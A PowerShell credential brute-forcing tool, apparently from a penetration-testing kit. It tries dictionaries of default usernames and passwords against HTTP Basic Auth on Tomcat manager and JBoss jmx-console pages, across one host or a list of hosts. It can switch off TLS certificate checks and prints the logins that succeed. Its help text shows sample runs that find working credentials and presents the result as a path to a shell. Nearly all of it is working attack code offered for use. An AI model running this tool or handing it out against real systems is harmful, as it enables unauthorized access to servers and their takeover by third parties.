<#
 	.SYNOPSIS
	This script attempts to login to basic authentication with default HTTP Basic Auth Credentials.
	The dictionary and configuration by default is set to attempt to loging to Tomcat servers
	using a dictionary of default usernames and passwords. This can be configurable in the parameters.
        Tomcat by default ships with very easy to guess manager interface passwords, and the manager 
        interface is rarely disabled...Leading to a shell party.

	Function: Invoke-HTTPBasicAuthLogin
	Author: Matt Kelly, @breakersall
	Required Dependencies: PSv3

	.PARAMETER Hosts

	Specify a file with hosts:ports to test against, example: C:\Temp\hosts.txt.

	.PARAMETER Computer

	Specify a single tomcat web server to test against in the form, IP:PORT, example: 192.168.1.10:8080
	
	.PARAMETER UserName

	Supply the username if testing custom, otherwise defaults to custom list.

	.PARAMETER Password

	Supply the username if testing custom, otherwise defaults to custom list.

	.PARAMETER UserNameFile

	Optionally supply a list of users, otherwise defaults to custom list.

	.PARAMETER PasswordFile

	Optionally supply a list of passwords, otherwise defaults to custom list.

	.PARAMETER URIPath

	Supply the URI to test, defaults to /manager/html/, example: -URIPath /jmx-console/.

	.PARAMETER IgnoreSSL

	Ignore bad SSL certificates switch -IgnoreSSL.
	
	.PARAMETER BigDictionary
	Use the larger dictionary of tomcat usernames and passwords
		
	.EXAMPLE

	Execute on a single host using the default builtin database:
	Invoke-HTTPBasicAuthLogin -Computer 192.168.1.10:8080

	    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,admin
	    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,
	    [-]Bad username and password on http://192.168.1.10:8080/manager/html with: admin,password
	    [+]Success on host http://192.168.1.10:8080 with Username: admin and Password tomcat
	    etc...

	
	.EXAMPLE

	Brute force Tomcat manager login on a single host ignoring SSL:
	Invoke-HTTPBasicAuthLogin -Computer 192.168.1.10:8443 -IgnoreSSL
	  
	.EXAMPLE

	Brute force Tomcat manager login on a list of hosts ignoring SSL:
	Invoke-HTTPBasicAuthLogin -File C:\Temp\Hosts.txt -IgnoreSSL
	
	  
	.EXAMPLE

	Brute force Tomcat manager login on a list of hosts ignoring SSL with a custom user and password dictionary:
	Invoke-HTTPBasicAuthLogin -File C:\Temp\Hosts.txt -IgnoreSSL -UserNameFile users.txt -PasswordFile passwords.txt

	.EXAMPLE

	Brute force a JBOSS web server login on a computer:
	Invoke-HTTPBasicAuthLogin -Computer 192.168.1.11:8080 -URIPath /jmx-console/
	.\Invoke-HttpBasicAuthLogin.ps1 -Computer 192.168.1.11:8080 -URIPath /jmx-console/
	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: admin,
	[+]Success on host http://192.168.1.11:8080/jmx-console/ with Username: admin and Password admin
	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: admin,password
	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: admin,tomcat
	<-- TRIMMED -->
	[-]Bad username and password on http://192.168.1.11:8080/jmx-console/ with: j2deployer,j2deployer
	
	Successfull Login:
	
	URI                                                      UserName                            Password                                               
	---                                                      --------                           --------                                               
	http://192.168.1.11:8080/jmx-console/                    admin                               admin    
		
#>
[CmdletBinding()]
Param(
		[Parameter(Mandatory=$false,
                   ParameterSetName = "All",
                   ValueFromPipelineByPropertyName=$true,
				   Position=0)]
		[ValidateScript({Test-Path $_})]
		[string]$File,
		
		[Parameter(Mandatory=$false,
                   ParameterSetName = "All",
                   ValueFromPipelineByPropertyName=$true)]
		[string]$Computer,

		[Parameter(Mandatory=$false,
                   ParameterSetName = "All",
                   ValueFromPipelineByPropertyName=$true)]
		[string]$UserName,

		[Parameter(Mandatory=$false,
                   ParameterSetName = "All",
                   ValueFromPipelineByPropertyName=$true)]
		[string]$Password,

		[Parameter(Mandatory=$false,
                   ParameterSetName = "All",
                   ValueFromPipelineByPropertyName=$true)]
		[ValidateScript({Test-Path $_})]
        [string]$UserNameFile,

		[Parameter(Mandatory=$false,
                   ParameterSetName = "All",
                   ValueFromPipelineByPropertyName=$true)]
		[string]$URIPath = "/manager/html",
		
		[Parameter(Mandatory=$false,
                   ParameterSetName = "All",
                   ValueFromPipelineByPropertyName=$true)]
        [ValidateScript({Test-Path $_})]		
        [string]$PasswordFile,

		[switch]$IgnoreSSL,

        [Switch]$BigDictionary

	)
#Build arrays of default usernames and passwords, passwords based of many lists including Metasploit and custom
if(!$UserName)
{
    if ($UserNameFile) { [array]$UserName = Get-Content $UserNameFile }
    elseif ($BigDictionary) { [array]$UserName = "admin","tomcat","administrator","manager","j2deployer","ovwebusr","cxsdk","root","xampp","ADMIN","testuser","cragigmcc" }
    else { [array]$UserName = "admin","tomcat","administrator","manager","j2deployer" }
}
if (!$Password)
{
    if ($PasswordFile) { [array]$Password = Get-Content $PasswordFile }
    elseif ($BigDictionary) { [array]$Password = "","admin","password","tomcat","manager","j2deployer","OvW*busr1","kdsxc","owaspbwa","ADMIN","xampp","s3cret","Password1","testuser","redi_123","secret" }
    else { [array]$Password = "","admin","password","tomcat","manager","j2deployer" }
}
#Ignore SSL From http://connect.microsoft.com/PowerShell/feedback/details/419466/new-webserviceproxy-needs-force-parameter-to-ignore-ssl-errors thanks @Mattifestation and HaIR
if ($IgnoreSSL)
{
add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy


}
$Success = @()
if (!$Computer)
{
    
    if ($File)
    {
        write-host "test"
		[array]$Computer = Get-Content $File
    }
    else
    {
        Write-Host "You must select either a Computer or File"
        exit
    }
}
    foreach ($User in $UserName)
    {
        foreach ($Pass in $Password)
            {
                $auth = $User + ':' + $Pass
                $Encoded = [System.Text.Encoding]::UTF8.GetBytes($auth)
                $EncodedPassword = [System.Convert]::ToBase64String($Encoded)
                $headers = @{"Authorization"="Basic $($EncodedPassword)"}
                foreach ($Computertarget in $Computer)
                {
                    if ($Computertarget -Match "443")
                    {
                        $URIHTTP = "https://"
                    }
                    else
                    {
                        $URIHTTP = "http://"
                    }
                    $URIString = $URIHTTP + $Computertarget + $URIPath
                    try
                    {
                        $Page = Invoke-RestMethod -Uri $URIString -Header $headers -Method Get
                        Write-Host "[+]Success on host $URIString with Username: $User and Password $Pass"
                            $SuccessLogin = [ordered]@{
                            URI = $URIString
                            UserName = $User
                            Password = $Pass
                        }
                        $SuccessLoginObj = [pscustomobject]$SuccessLogin
                        $Success += $SuccessLoginObj

                    
                    }
                    catch
                    {
                        Write-Host "[-]Bad username and password on $URIString with: $User,$Pass"
                    }
                }
         
      }
    
}
if($Success)
{
    Write-Host ""
    Write-Host "Successfull Login:"
    $Success
}
